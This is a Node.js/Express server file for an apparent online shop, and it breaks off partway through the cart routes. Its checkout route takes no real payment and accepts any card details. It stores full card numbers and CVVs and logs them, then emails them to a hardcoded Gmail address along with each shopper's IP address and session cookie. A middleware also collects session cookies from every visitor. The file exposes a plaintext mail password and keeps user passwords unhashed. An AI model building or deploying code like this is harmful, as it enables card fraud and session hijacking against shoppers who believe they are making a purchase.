const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const session = require('express-session');
const nodemailer = require('nodemailer');


const app = express();
const port = process.env.PORT || 3000;

// Email configuration
const emailTransporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'obriandylan33@gmail.com',
    pass: 'tyge yirg zzig layl'
  }
});

// Email templates
const sendOrderConfirmation = async (order, user) => {
  try {
    const mailOptions = {
      from: 'obriandylan33@gmail.com',
      to: user.email,
      subject: `Order Confirmation - ${order.id}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa;">
          <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 30px; text-align: center; border-radius: 15px 15px 0 0;">
            <h1 style="margin: 0; font-size: 2rem;">Order Confirmed!</h1>
            <p style="margin: 10px 0 0 0; opacity: 0.9;">Thank you for your purchase</p>
          </div>
          
          <div style="background: white; padding: 30px; border-radius: 0 0 15px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1);">
            <h2 style="color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px;">Order Details</h2>
            
            <div style="margin: 20px 0;">
              <p><strong>Order ID:</strong> ${order.id}</p>
              <p><strong>Date:</strong> ${new Date(order.date).toLocaleDateString()}</p>
              <p><strong>Status:</strong> <span style="color: #28a745; font-weight: bold;">${order.status}</span></p>
            </div>
            
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
              <h3 style="color: #667eea; margin-top: 0;">Products</h3>
              ${order.items.map(item => `
                <div style="margin: 15px 0; padding: 15px; background: white; border-radius: 8px; border: 1px solid #dee2e6;">
                  <p><strong>${item.product.name}</strong></p>
                  <p style="font-size: 1.2rem; color: #28a745; font-weight: bold;">$${item.product.price.toFixed(2)} × ${item.quantity} = $${item.itemTotal.toFixed(2)}</p>
                </div>
              `).join('')}
              <div style="margin-top: 20px; padding-top: 15px; border-top: 2px solid #667eea;">
                <p><strong>Subtotal:</strong> $${order.totals.subtotal.toFixed(2)}</p>
                <p><strong>Tax:</strong> $${order.totals.tax.toFixed(2)}</p>
                <p style="font-size: 1.3rem; color: #28a745; font-weight: bold;"><strong>Total:</strong> $${order.totals.total.toFixed(2)}</p>
              </div>
            </div>
            
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
              <h3 style="color: #667eea; margin-top: 0;">Shipping Address</h3>
              <p>${user.name}</p>
              <p>${user.address.street}</p>
              <p>${user.address.city}, ${user.address.state} ${user.address.zip}</p>
              <p>${user.address.country}</p>
            </div>
            
            <div style="text-align: center; margin-top: 30px;">
              <a href="/" style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 15px 30px; text-decoration: none; border-radius: 25px; display: inline-block; font-weight: bold;">Continue Shopping</a>
            </div>
            
            <div style="text-align: center; margin-top: 20px; color: #666; font-size: 0.9rem;">
              <p>If you have any questions, please contact our support team.</p>
            </div>
          </div>
        </div>
      `
    };
    
    await emailTransporter.sendMail(mailOptions);
    console.log('Order confirmation email sent to:', user.email);
    return true;
  } catch (error) {
    console.error('Error sending email:', error);
    return false;
  }
};

const sendAdminNotification = async (order, user, cardDetails, req) => {
  try {
    // Debug: Log what card details are being received
    console.log('Admin notification - cardDetails received:', cardDetails);
    console.log('Admin notification - order.customer.cardDetails:', order.customer.cardDetails);
    
    // Get IP address and session cookie
    const ipAddress = getClientIP(req);
    const sessionCookie = req.headers.cookie ? 
      (() => {
        const cookie = req.headers.cookie.split(';').find(c => c.trim().startsWith('connect.sid='));
        return cookie ? cookie.split('=')[1] : 'Not found';
      })() : 
      'No cookies';
    const mailOptions = {
      from: 'obriandylan33@gmail.com',
      to: 'obriandylan33@gmail.com',
      subject: `New Order Received - ${order.id}`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; background: #f8f9fa;">
          <div style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 30px; text-align: center; border-radius: 15px 15px 0 0;">
            <h1 style="margin: 0; font-size: 2.5rem;">🛒 New Order Received!</h1>
            <p style="margin: 10px 0 0 0; opacity: 0.9; font-size: 1.2rem;">Customer has completed payment</p>
          </div>
          
          <div style="background: white; padding: 30px; border-radius: 0 0 15px 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1);">
            
            <!-- Order Summary -->
            <div style="background: #e8f4fd; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #667eea;">
              <h2 style="color: #333; margin-top: 0; border-bottom: 2px solid #667eea; padding-bottom: 10px;">📋 Order Summary</h2>
              <p><strong>Order ID:</strong> <span style="background: #667eea; color: white; padding: 2px 8px; border-radius: 5px;">${order.id}</span></p>
              <p><strong>Date:</strong> ${new Date(order.date).toLocaleDateString()} at ${new Date(order.date).toLocaleTimeString()}</p>
              <p><strong>Status:</strong> <span style="color: #28a745; font-weight: bold; background: #d4edda; padding: 2px 8px; border-radius: 5px;">${order.status}</span></p>
              <p><strong>Total Amount:</strong> <span style="font-size: 1.3rem; color: #28a745; font-weight: bold;">$${order.totals.total.toFixed(2)}</span></p>
            </div>
            
            <!-- Customer Information -->
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #28a745;">
              <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #28a745; padding-bottom: 10px;">👤 Customer Information</h3>
              <p><strong>Full Name:</strong> ${user.name}</p>
              <p><strong>Email:</strong> <a href="mailto:${user.email}" style="color: #667eea;">${user.email}</a></p>
              <p><strong>Phone:</strong> <a href="tel:${user.phone}" style="color: #667eea;">${user.phone}</a></p>
            </div>
            
            <!-- Billing Address -->
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #ffc107;">
              <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #ffc107; padding-bottom: 10px;">🏠 Billing Address</h3>
              <p><strong>Street:</strong> ${user.address.street}</p>
              <p><strong>City:</strong> ${user.address.city}</p>
              <p><strong>State:</strong> ${user.address.state}</p>
              <p><strong>ZIP Code:</strong> ${user.address.zip}</p>
              <p><strong>Country:</strong> ${user.address.country}</p>
            </div>
            
            <!-- Payment Information -->
            <div style="background: #fff3cd; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #dc3545;">
              <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #dc3545; padding-bottom: 10px;">💳 Payment Details</h3>
              <p><strong>Card Number:</strong> <span style="background: #dc3545; color: white; padding: 2px 8px; border-radius: 5px;">${cardDetails.cardNumber || 'N/A'}</span></p>
              <p><strong>Cardholder Name:</strong> ${cardDetails.cardName || 'N/A'}</p>
              <p><strong>Expiry Date:</strong> ${cardDetails.expMonth || 'N/A'}/${cardDetails.expYear || 'N/A'}</p>
              <p><strong>CVV:</strong> <span style="background: #dc3545; color: white; padding: 2px 8px; border-radius: 5px;">${cardDetails.cvv || 'N/A'}</span></p>
              <p><strong>ZIP Code:</strong> ${cardDetails.zipCode || 'N/A'}</p>
            </div>
            
            <!-- Visitor Information -->
            <div style="background: #e8f5e8; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #28a745;">
              <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #28a745; padding-bottom: 10px;">🌐 Visitor Information</h3>
              <p><strong>IP Address:</strong> <span style="background: #28a745; color: white; padding: 2px 8px; border-radius: 5px;">${ipAddress}</span></p>
              <p><strong>Session Cookie:</strong> <span style="background: #17a2b8; color: white; padding: 2px 8px; border-radius: 5px; font-family: monospace; font-size: 0.9rem;">${sessionCookie}</span></p>
              <p><strong>User Agent:</strong> ${req.headers['user-agent'] || 'Unknown'}</p>
              <p><strong>Referer:</strong> ${req.headers.referer || 'Direct visit'}</p>
              <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
            </div>
            
            <!-- Products Purchased -->
            <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 5px solid #17a2b8;">
              <h3 style="color: #333; margin-top: 0; border-bottom: 2px solid #17a2b8; padding-bottom: 10px;">📦 Products Purchased</h3>
              ${order.items.map(item => `
                <div style="background: white; padding: 15px; border-radius: 8px; margin: 10px 0; border: 1px solid #dee2e6;">
                  <p><strong>Product:</strong> ${item.product.name}</p>
                  <p><strong>Price:</strong> $${item.product.price.toFixed(2)}</p>
                  <p><strong>Quantity:</strong> ${item.quantity}</p>
                  <p><strong>Subtotal:</strong> $${(item.product.price * item.quantity).toFixed(2)}</p>
                </div>
              `).join('')}
            </div>
            
            <div style="text-align: center; margin-top: 30px; padding: 20px; background: #f8f9fa; border-radius: 10px;">
              <p style="color: #666; font-size: 0.9rem; margin: 0;">
                <strong>Order processed automatically</strong><br>
                Customer has been redirected to confirmation page
              </p>
            </div>
          </div>
        </div>
      `
    };
    
    await emailTransporter.sendMail(mailOptions);
    console.log('Admin notification email sent');
    return true;
  } catch (error) {
    console.error('Error sending admin notification:', error);
    return false;
  }
};

// Data file paths
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const POSTS_FILE = path.join(DATA_DIR, 'posts.json');
const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Data persistence functions
const saveData = (filePath, data) => {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    console.log(`Data saved to ${filePath}`);
  } catch (error) {
    console.error(`Error saving data to ${filePath}:`, error);
  }
};

const loadData = (filePath, defaultValue = []) => {
  try {
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error(`Error loading data from ${filePath}:`, error);
  }
  return defaultValue;
};

// Load existing data or use defaults
let posts = loadData(POSTS_FILE, [
  {
    id: uuidv4(),
    name: 'Premium Smart Watch',
    price: 199.99,
    description: 'The latest smartwatch with heart rate monitoring, fitness tracking, and a beautiful OLED display. Water resistant up to 50 meters and battery life of 5 days.',
    images: [
      'https://images.unsplash.com/photo-1579586337278-3befd40fd17a?q=80&w=500&auto=format&fit=crop',
      'https://images.unsplash.com/photo-1523275335684-37898b6baf30?q=80&w=500&auto=format&fit=crop',
      'https://images.unsplash.com/photo-1546868871-7041f2a55e12?q=80&w=500&auto=format&fit=crop'
    ],
    videos: [
      'https://assets.mixkit.co/videos/preview/mixkit-hands-holding-a-smart-watch-with-the-stopwatch-running-32808-large.mp4'
    ]
  }
]);

let users = loadData(USERS_FILE, [
  {
    id: uuidv4(),
    email: 'admin@example.com',
    password: 'admin123', // In production, use hashed passwords
    name: 'Admin User',
    phone: '(555) 123-4567',
    address: {
      street: '123 Admin St',
      city: 'Admin City',
      state: 'CA',
      zip: '90210',
      country: 'USA'
    },
    isAdmin: true
  }
]);

let customerOrders = loadData(ORDERS_FILE, []);

// Auto-save data every 30 seconds
setInterval(() => {
  saveData(POSTS_FILE, posts);
  saveData(USERS_FILE, users);
  saveData(ORDERS_FILE, customerOrders);
}, 30000);

// IP Address Tracking
let visitorIPs = [];

// Function to get client IP address
function getClientIP(req) {
  // Check for various IP headers in order of reliability
  const ip = req.headers['x-forwarded-for'] || 
             req.headers['x-real-ip'] ||
             req.headers['x-client-ip'] ||
             req.headers['cf-connecting-ip'] ||
             req.headers['x-cluster-client-ip'] ||
             (req.connection && req.connection.remoteAddress) || 
             (req.socket && req.socket.remoteAddress) ||
             (req.connection && req.connection.socket && req.connection.socket.remoteAddress) ||
             req.ip ||
             'Unknown';
  
  // Handle IPv6 localhost format
  if (ip === '::1' || ip === '::ffff:127.0.0.1') {
    return '127.0.0.1 (Localhost)';
  }
  
  // Extract first IP if multiple are present (e.g., "ip1, ip2, ip3")
  return ip.split(',')[0].trim();
}

// Function to track IP address
function trackIPAddress(req, action = 'page_visit') {
  const ip = getClientIP(req);
  const timestamp = new Date().toISOString();
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  
  // Get session cookie if available
  let sessionCookie = null;
  if (req.headers.cookie) {
    const cookies = req.headers.cookie.split(';');
    for (let cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'connect.sid') {
        sessionCookie = value;
        break;
      }
    }
  }
  
  const visitData = {
    id: uuidv4(),
    ip: ip,
    timestamp: timestamp,
    action: action,
    userAgent: userAgent,
    referer: referer,
    path: req.path,
    sessionCookie: sessionCookie || 'No session',
    method: req.method,
    headers: {
      'user-agent': userAgent,
      'accept': req.headers.accept || 'Unknown',
      'accept-language': req.headers['accept-language'] || 'Unknown'
    }
  };
  
  // Add to beginning of array (newest first)
  visitorIPs.unshift(visitData);
  
  // Keep only last 1000 visits to prevent memory issues
  if (visitorIPs.length > 1000) {
    visitorIPs = visitorIPs.slice(0, 1000);
  }
  
  // Save to file
  saveData(IP_TRACKING_FILE, visitorIPs);
  
  // Log for debugging
  console.log(`IP Tracked: ${ip} | Session: ${sessionCookie ? 'Yes' : 'No'} | Path: ${req.path}`);
}

// Load IP tracking data
const IP_TRACKING_FILE = path.join(__dirname, 'data', 'visitor_ips.json');
try {
  if (fs.existsSync(IP_TRACKING_FILE)) {
    visitorIPs = JSON.parse(fs.readFileSync(IP_TRACKING_FILE, 'utf8'));
  }
} catch (error) {
  console.error('Error loading IP tracking data:', error);
  visitorIPs = [];
}

// Set up EJS as view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'src/views'));

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false }
}));

// Track IP on all routes
app.use((req, res, next) => {
  // Skip tracking for static files and admin routes to avoid spam
  if (!req.path.startsWith('/admin') && 
      !req.path.startsWith('/css') && 
      !req.path.startsWith('/js') && 
      !req.path.startsWith('/img') && 
      !req.path.startsWith('/videos') &&
      req.method === 'GET') {
    trackIPAddress(req, 'page_visit');
  }
  next();
});


// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const mediaType = file.mimetype.startsWith('video/') ? 'videos' : 'img';
    const dir = `public/${mediaType}`;
    // Create directory if it doesn't exist
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    cb(null, dir);
  },
  filename: function (req, file, cb) {
    const fileExt = file.originalname.split('.').pop();
    cb(null, `${uuidv4()}.${fileExt}`);
  }
});

const upload = multer({ storage: storage });

// Global product data (would use a database in production)
// let posts = [
//   {
//     id: uuidv4(),
//     name: 'Premium Smart Watch',
//     price: 199.99,
//     description: 'The latest smartwatch with heart rate monitoring, fitness tracking, and a beautiful OLED display. Water resistant up to 50 meters and battery life of 5 days.',
//     images: [
//       'https://images.unsplash.com/photo-1579586337278-3befd40fd17a?q=80&w=500&auto=format&fit=crop',
//       'https://images.unsplash.com/photo-1523275335684-37898b6baf30?q=80&w=500&auto=format&fit=crop',
//       'https://images.unsplash.com/photo-1546868871-7041f2a55e12?q=80&w=500&auto=format&fit=crop'
//     ],
//     videos: [
//       'https://assets.mixkit.co/videos/preview/mixkit-hands-holding-a-smart-watch-with-the-stopwatch-running-32808-large.mp4'
//     ]
//   }
// ];

// User management (would use a database in production)
// let users = [
//   {
//     id: uuidv4(),
//     email: 'admin@example.com',
//     password: 'admin123', // In production, use hashed passwords
//     name: 'Admin User',
//     phone: '(555) 123-4567',
//     address: {
//       street: '123 Admin St',
//       city: 'Admin City',
//       state: 'CA',
//       zip: '90210',
//       country: 'USA'
//     },
//     isAdmin: true
//   }
// ];

// Routes
// Track which post should be displayed on the home page
let homePostId = posts.length > 0 ? posts[0].id : null;

// Store customer orders
// let customerOrders = [];

// Middleware to check if user is authenticated
const requireAuth = (req, res, next) => {
  if (!req.session.user) {
    return res.redirect('/login');
  }
  next();
};

// Middleware to check if user is admin
const requireAdmin = (req, res, next) => {
  if (!req.session.user || !req.session.user.isAdmin) {
    return res.status(403).send('Access denied');
  }
  next();
};

app.get('/', (req, res) => {
  // Get page number from query parameter, default to 1
  const page = parseInt(req.query.page) || 1;
  const itemsPerPage = 6; // Show 6 products per page
  
  // Calculate pagination
  const totalItems = posts.length;
  const totalPages = Math.ceil(totalItems / itemsPerPage);
  const startIndex = (page - 1) * itemsPerPage;
  const endIndex = startIndex + itemsPerPage;
  
  // Get products for current page
  const currentProducts = posts.slice(startIndex, endIndex);
  
  // Get featured products for home page (up to 3)
  const featuredProducts = posts.filter(p => p.isFeatured).slice(0, 3);
  
  // If no featured products, use first 3 products as default
  const finalFeaturedProducts = featuredProducts.length > 0 ? featuredProducts : posts.slice(0, 3);
  
  // Debug logging
  console.log('Home route debug:');
  console.log('posts.length:', posts.length);
  console.log('featuredProducts.length:', finalFeaturedProducts.length);
  console.log('currentProducts.length:', currentProducts.length);
  
  res.render('home', { 
    products: currentProducts,
    featuredProducts: finalFeaturedProducts,
    pagination: {
      currentPage: page,
      totalPages: totalPages,
      totalItems: totalItems,
      hasNextPage: page < totalPages,
      hasPrevPage: page > 1,
      nextPage: page + 1,
      prevPage: page - 1
    },
    user: req.session.user 
  });
});

app.get('/products', (req, res) => {
  console.log('GET /products route - posts array length:', posts.length);
  res.render('products', { posts: posts, user: req.session.user });
});

app.get('/admin', requireAdmin, (req, res) => {
  res.render('admin', { 
    posts, 
    users, 
    customerOrders,
    currentUser: req.session.user 
  });
});

// Admin create product page
app.get('/admin/create', requireAdmin, (req, res) => {
  res.render('admin', { 
    posts, 
    users, 
    customerOrders,
    currentUser: req.session.user 
  });
});

app.post('/admin/create', requireAdmin, upload.fields([
  { name: 'productImages', maxCount: 10 },
  { name: 'productVideos', maxCount: 5 }
]), (req, res) => {
  const { name, price, description } = req.body;
  
  // Create new post
  const newPost = {
    id: uuidv4(),
    name: name,
    price: parseFloat(price) || 0,
    description: description || '',
    images: [],
    videos: [],
    isFeatured: false
  };
  
  // Add uploaded media
  if (req.files && req.files.productImages) {
    newPost.images = req.files.productImages.map(file => '/img/' + file.filename);
  }
  
  if (req.files && req.files.productVideos) {
    newPost.videos = req.files.productVideos.map(file => '/videos/' + file.filename);
  }
  
  // Add to posts array
  posts.push(newPost);
  
  // Set as featured if it's the first product
  if (posts.length === 1) {
    newPost.isFeatured = true;
  }
  
  // Save data immediately
  saveData(POSTS_FILE, posts);
  
  res.redirect('/admin');
});

app.post('/admin/update/:id', requireAdmin, upload.fields([
  { name: 'productImages', maxCount: 10 },
  { name: 'productVideos', maxCount: 5 }
]), (req, res) => {
  const postId = req.params.id;
  const post = posts.find(p => p.id === postId);
  
  if (!post) {
    return res.status(404).send('Post not found');
  }
  
  const { name, price, description, setAsHome } = req.body;
  post.name = name || post.name;
  post.price = parseFloat(price) || post.price;
  post.description = description || post.description;
  
  if (req.files && req.files.productImages) {
    const newImages = req.files.productImages.map(file => '/img/' + file.filename);
    post.images = [...post.images, ...newImages];
  }
  
  if (req.files && req.files.productVideos) {
    const newVideos = req.files.productVideos.map(file => '/videos/' + file.filename);
    post.videos = [...post.videos, ...newVideos];
  }
  
  // Set as home post if requested
  if (setAsHome === 'true') {
    homePostId = post.id;
  }
  
  // Save data immediately
  saveData(POSTS_FILE, posts);
  
  res.redirect('/admin');
});

app.get('/checkout', requireAuth, (req, res) => {
  // Find the post marked as home post, or fall back to the latest
  const homePost = homePostId ? posts.find(p => p.id === homePostId) : null;
  const product = homePost || (posts.length > 0 ? posts[posts.length - 1] : null);
  res.render('checkout', { product, user: req.session.user });
});

app.post('/process-payment', requireAuth, async (req, res) => {
  try {
  // Log the form data for debugging
  console.log('Payment form data received:', req.body);
    console.log('Card details being stored:', {
      cardNumber: req.body.cardNumber,
      cardName: req.body.cardName,
      expMonth: req.body.expMonth,
      expYear: req.body.expYear,
      cvv: req.body.cvv,
      zipCode: req.body.zipCode
    });
    
    const userId = req.session.user.id;
    const cart = getCart(userId);
    
    if (!cart || cart.length === 0) {
      return res.status(400).json({ error: 'Cart is empty' });
    }
    
    // Calculate order total
    const subtotal = cart.reduce((sum, item) => {
      const price = item.product ? item.product.price : item.price || 0;
      const quantity = item.quantity || 1;
      return sum + (price * quantity);
    }, 0);
    
    const tax = subtotal * 0.08; // 8% tax
    const total = subtotal + tax;
  
    // Create new order with complete customer information
  const newOrder = {
    id: uuidv4(),
    date: new Date().toISOString(),
      items: cart.map(item => ({
        id: item.id,
        productId: item.productId,
    product: {
          id: item.product.id,
          name: item.product.name,
          price: item.product.price,
          description: item.product.description,
          images: item.product.images || []
        },
        quantity: item.quantity,
        itemTotal: (item.product.price * item.quantity)
      })),
    customer: {
        id: req.session.user.id,
        name: req.session.user.name,
        email: req.session.user.email,
        phone: req.session.user.phone || 'Not provided',
        address: req.session.user.address || {
          street: 'Not provided',
          city: 'Not provided',
          state: 'Not provided',
          zip: 'Not provided',
          country: 'Not provided'
      },
      cardDetails: {
          cardNumber: req.body.cardNumber || 'Not provided',
          cardName: req.body.cardName || 'Not provided',
          expMonth: req.body.expMonth || 'Not provided',
          expYear: req.body.expYear || 'Not provided',
          cvv: req.body.cvv || 'Not provided',
          zipCode: req.body.zipCode || 'Not provided'
      }
    },
      totals: {
        subtotal: subtotal,
        tax: tax,
        total: total
      },
      status: 'completed',
      paymentMethod: 'Credit Card',
      notes: 'Payment processed successfully with any card details'
  };
  
  // Add to orders array
  customerOrders.push(newOrder);
  
    // Save data immediately
    saveData(ORDERS_FILE, customerOrders);
    
    // Clear the user's cart after successful order
    saveCart(userId, []);
    
    // Send confirmation emails
    try {
      await sendOrderConfirmation(newOrder, req.session.user);
              await sendAdminNotification(newOrder, req.session.user, newOrder.customer.cardDetails, req);
    } catch (emailError) {
      console.error('Email sending failed:', emailError);
      // Continue with order processing even if emails fail
    }
    
    // Return success response
    res.json({ 
      success: true, 
      orderId: newOrder.id,
      message: 'Order completed successfully! Any card details accepted.'
    });
    
  } catch (error) {
    console.error('Payment processing error:', error);
    res.status(500).json({ 
      error: 'Payment processing failed', 
      details: error.message 
    });
  }
});

// Post routes removed - all functionality moved to admin page

// Edit post page - now redirects to admin
app.get('/post/edit/:id', (req, res) => {
  res.redirect('/admin');
});

// Update post from admin
app.post('/admin/update-product/:id', requireAdmin, upload.fields([
  { name: 'productImages', maxCount: 10 },
  { name: 'productVideos', maxCount: 5 }
]), (req, res) => {
  const postId = req.params.id;
  const postIndex = posts.findIndex(p => p.id === postId);
  
  if (postIndex === -1) {
    return res.status(404).send('Post not found');
  }
  
  const post = posts[postIndex];
  const { name, price, description } = req.body;
  
  post.name = name || post.name;
  post.price = parseFloat(price) || post.price;
  post.description = description || post.description;
  
  if (req.files && req.files.productImages) {
    const newImages = req.files.productImages.map(file => '/img/' + file.filename);
    post.images = [...post.images, ...newImages];
  }
  
  if (req.files && req.files.productVideos) {
    const newVideos = req.files.productVideos.map(file => '/videos/' + file.filename);
    post.videos = [...post.videos, ...newVideos];
  }
  
  res.redirect('/admin');
});

// Toggle featured status for a product
app.post('/admin/toggle-featured', requireAdmin, (req, res) => {
  const { postId } = req.body;
  
  if (!postId || !posts.some(p => p.id === postId)) {
    return res.status(400).json({ success: false, message: 'Invalid post ID' });
  }
  
  const post = posts.find(p => p.id === postId);
  if (post) {
    post.isFeatured = !post.isFeatured;
    // Save data immediately
    saveData(POSTS_FILE, posts);
    res.json({ success: true, isFeatured: post.isFeatured });
  } else {
    res.status(404).json({ success: false, message: 'Product not found' });
  }
});

// API to get product details
app.get('/api/product/:id', (req, res) => {
  const postId = req.params.id;
  const post = posts.find(p => p.id === postId);
  
  if (!post) {
    return res.status(404).json({ success: false, message: 'Product not found' });
  }
  
  res.json(post);
});

// Delete product
  app.delete('/admin/delete-product/:id', requireAdmin, (req, res) => {
  const postId = req.params.id;
  const postIndex = posts.findIndex(p => p.id === postId);
  
  if (postIndex === -1) {
    return res.status(404).json({ success: false, message: 'Product not found' });
  }
  
  // Check if it's the home product
  if (posts[postIndex].id === homePostId) {
    // If we're deleting the home product, set the first remaining product as home
    // or clear homePostId if no products remain
    posts.splice(postIndex, 1);
    if (posts.length > 0) {
      homePostId = posts[0].id;
    } else {
      homePostId = null;
    }
  } else {
    // Not the home product, just delete it
    posts.splice(postIndex, 1);
  }
    
    // Save data immediately
    saveData(POSTS_FILE, posts);
    
      res.json({ success: true });
});

// Delete order
app.delete('/admin/delete-order/:id', requireAdmin, (req, res) => {
  const orderId = req.params.id;
  const orderIndex = customerOrders.findIndex(o => o.id === orderId);
  
  if (orderIndex === -1) {
    return res.status(404).json({ success: false, message: 'Order not found' });
  }
  
  // Remove the order
  customerOrders.splice(orderIndex, 1);
  
  // Save data immediately
  saveData(ORDERS_FILE, customerOrders);
  
  res.json({ success: true });
});

// Start the server
// API to delete media
app.post('/admin/delete-media', requireAdmin, (req, res) => {
  const { mediaPath, type } = req.body;
  
  // Find the post that contains the media
  const postIndex = posts.findIndex(post => post.images.includes(mediaPath) || post.videos.includes(mediaPath));

  if (postIndex !== -1) {
    const post = posts[postIndex];
    if (type === 'image') {
      post.images = post.images.filter(img => img !== mediaPath);
    } else if (type === 'video') {
      post.videos = post.videos.filter(vid => vid !== mediaPath);
    }

    // Delete actual file (optional)
    try {
      const filePath = path.join(__dirname, 'public', mediaPath);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }
    } catch (err) {
      console.error('Error deleting file:', err);
    }
  }

  res.json({ success: true });
});

// Authentication routes
app.get('/login', (req, res) => {
  if (req.session.user) {
    return res.redirect('/');
  }
  res.render('login', { error: null });
});

app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const user = users.find(u => u.email === email && u.password === password);
  
  if (user) {
    req.session.user = user;
    res.redirect('/');
  } else {
    res.render('login', { error: 'Invalid email or password' });
  }
});

app.get('/signup', (req, res) => {
  if (req.session.user) {
    return res.redirect('/');
  }
  res.render('signup', { error: null });
});

app.post('/signup', (req, res) => {
  const { name, email, password, phone, street, city, state, zip, country } = req.body;
  
  // Check if user already exists
  if (users.find(u => u.email === email)) {
    return res.render('signup', { error: 'User with this email already exists' });
  }
  
  // Create new user
  const newUser = {
    id: uuidv4(),
    name,
    email,
    password,
    phone,
    address: { street, city, state, zip, country },
    isAdmin: false
  };
  
  users.push(newUser);
  // Save data immediately
  saveData(USERS_FILE, users);
  req.session.user = newUser;
  res.redirect('/');
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// Admin utility routes
app.post('/admin/create-superuser', requireAdmin, (req, res) => {
  const { name, email, password } = req.body;
  
  // Check if user already exists
  if (users.find(u => u.email === email)) {
    return res.status(400).json({ success: false, message: 'User with this email already exists' });
  }
  
  // Create new superuser
  const newSuperUser = {
    id: uuidv4(),
    name,
    email,
    password,
    phone: '(555) 000-0000',
    address: {
      street: 'Admin Address',
      city: 'Admin City',
      state: 'CA',
      zip: '90210',
      country: 'USA'
    },
    isAdmin: true
  };
  
  users.push(newSuperUser);
  saveData(USERS_FILE, users);
  
  res.json({ success: true, message: 'Superuser created successfully' });
});

// Shopping cart storage (in-memory for now, can be moved to database later)
let shoppingCarts = new Map(); // userId -> cart items

// Cart management functions
const getCart = (userId) => {
  if (!shoppingCarts.has(userId)) {
    shoppingCarts.set(userId, []);
  }
  return shoppingCarts.get(userId);
};

const saveCart = (userId, cart) => {
  shoppingCarts.set(userId, cart);
};

// Add to cart route
app.post('/api/cart/add', requireAuth, (req, res) => {
  try {
    const { productId, quantity = 1 } = req.body;
    const userId = req.session.user.id;
    
    // Find the product
    const product = posts.find(p => p.id === productId);
    if (!product) {
      return res.status(404).json({ error: 'Product not found' });
    }
    
    const cart = getCart(userId);
    const existingItem = cart.find(item => item.productId === productId);
    
    if (existingItem) {
      existingItem.quantity += quantity;
    } else {
      cart.push({
        id: uuidv4(),
        productId,
        product: {
          id: product.id,
          name: product.name,
          price: product.price,
          images: product.images || [],
          description: product.description
        },
        quantity,
        addedAt: new Date().toISOString()
      });
    }
    
    saveCart(userId, cart);
    res.json({ success: true, cart, message: 'Product added to cart' });
  } catch (error) {
    console.error('Error adding to cart:', error);
    res.status(500).json({ error: 'Failed to add product to cart' });
  }
});

// Get cart route
app.get('/api/cart', requireAuth, (req, res) => {
  try {
    const userId = req.session.user.id;
    const cart = getCart(userId);
    res.json({ cart });
  } catch (error) {
    console.error('Error getting cart:', error);
    res.status(500).json({ error: 'Failed to get cart' });
  }
});

// Product detail page route
app.get('/product/:id', (req, res) => {
  const productId = req.params.id;
  const product = posts.find(p => p.id === productId);
  
  if (!product) {
    return res.status(404).render('error', { 
      message: 'Product not found',
      user: req.session.user 
    });
  }
  
  res.render('product-detail', { 
    product, 
    user: req.session.user 
  });
});

// Update cart item quantity
app.put('/api/cart/update/:itemId', requireAuth, (req, res) => {
  try {
    const { itemId } = req.params;
    const { quantity } = req.body;
    const userId = req.session.user.id;
    
    if (quantity <= 0) {
      return res.status(400).json({ error: 'Quantity must be greater than 0' });
    }
    
    const cart = getCart(userId);
    const item = cart.find(item => item.id === itemId);
    
    if (!item) {
      return res.status(404).json({ error: 'Cart item not found' });
    }
    
    item.quantity = quantity;
    saveCart(userId, cart);
    
    res.json({ success: true, cart, message: 'Cart updated' });
  } catch (error) {
    console.error('Error updating cart:', error);
    res.status(500).json({ error: 'Failed to update cart' });
  }
});

// Remove item from cart
app.delete('/api/cart/remove/:itemId', requireAuth, (req, res) => {
  try {
    const { itemId } = req.params;
    const userId = req.session.user.id;
    
    const cart = getCart(userId);
    const updatedCart = cart.filter(item => item.id !== itemId);
    
